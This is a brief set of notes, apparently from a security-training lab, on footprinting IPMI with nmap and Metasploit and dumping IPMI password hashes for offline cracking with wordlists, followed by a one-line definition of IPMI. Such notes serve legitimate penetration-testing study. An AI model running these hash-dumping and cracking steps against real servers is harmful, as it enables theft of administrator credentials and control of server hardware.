```
#Footprinting
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

#MetaSploit Scan
msf6 > use auxiliary/scanner/ipmi/ipmi_version
> set rhosts <target-ip>
> run

#Metasploit dumping hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes
> set rhosts <target-ip>
> run
-Experimenting with different word lists is crucial for obtaining the password from the acquired hash.


```





[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.

